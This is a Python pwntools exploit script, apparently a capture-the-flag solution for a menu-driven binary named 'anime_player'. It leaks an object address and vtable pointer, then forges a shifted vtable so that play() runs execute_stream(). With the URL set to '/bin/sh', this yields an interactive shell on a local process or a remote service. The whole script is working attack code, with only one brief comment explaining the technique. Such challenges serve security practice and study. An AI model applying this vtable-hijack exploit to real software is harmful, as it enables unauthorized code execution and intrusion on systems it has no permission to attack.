#!/usr/bin/env python3

from pwn import *

exe = ELF("./anime_player")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def add_anime(title: bytes, episode: bytes, url: bytes) -> int:
    r.sendlineafter(b"Choice > ", b"1")
    r.sendlineafter(b"Title: ", title)
    r.sendlineafter(b"Episode: ", episode)
    r.sendlineafter(b"URL: ", url)
    r.recvuntil(b"[+] Added at index ")
    return int(r.recvline())


def add_raw(vtable, slot0: int = 0, slot1: int = 0) -> int:
    r.sendlineafter(b"Choice > ", b"2")
    r.sendlineafter(b"Target Vtable Ptr (hex): 0x", hex(vtable).encode())
    r.sendlineafter(b"Slot 0 (hex): 0x", hex(slot0).encode())
    r.sendlineafter(b"Slot 1 (hex): 0x", hex(slot1).encode())
    r.recvuntil(b"[+] Added at index ")
    return int(r.recvline())


def view(index: int):
    r.sendlineafter(b"Choice > ", b"3")
    r.sendlineafter(b"Index: ", str(index).encode())


def play(index: int):
    r.sendlineafter(b"Choice > ", b"4")
    r.sendlineafter(b"Index: ", str(index).encode())


def delete(index: int):
    r.sendlineafter(b"Choice > ", b"5")
    r.sendlineafter(b"Index: ", str(index).encode())


def update_url(index: int, url: bytes):
    r.sendlineafter(b"Choice > ", b"6")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"New URL: ", url)


def export_media(index: int) -> (int, int):
    r.sendlineafter(b"Choice > ", b"7")
    r.sendlineafter(b"Index: ", str(index).encode())

    # Returns the two object info
    r.recvuntil(b"Object Address: ")
    object_addr = int(r.recvline().strip(), 16)

    r.recvuntil(b"Vtable Pointer: ")
    vtable = int(r.recvline().strip(), 16)

    return object_addr, vtable


def exit_program():
    r.sendlineafter(b"Choice > ", b"8")


def main():
    r = conn()

    add_anime(b"A" * 8, b"1", b"B" * 8)
    object_addr, vtable = export_media(0)

    log.info(f"object: {object_addr:#x}")
    log.info(f"vtable: {vtable:#x}")

    # Shift the vtable pointer to 24B after, so the
    # object's `play()` function will be a call to
    # the `execute_stream()` function instead
    add_raw(vtable + 24)
    update_url(1, b"/bin/sh")

    play(1)
    r.interactive()


if __name__ == "__main__":
    main()

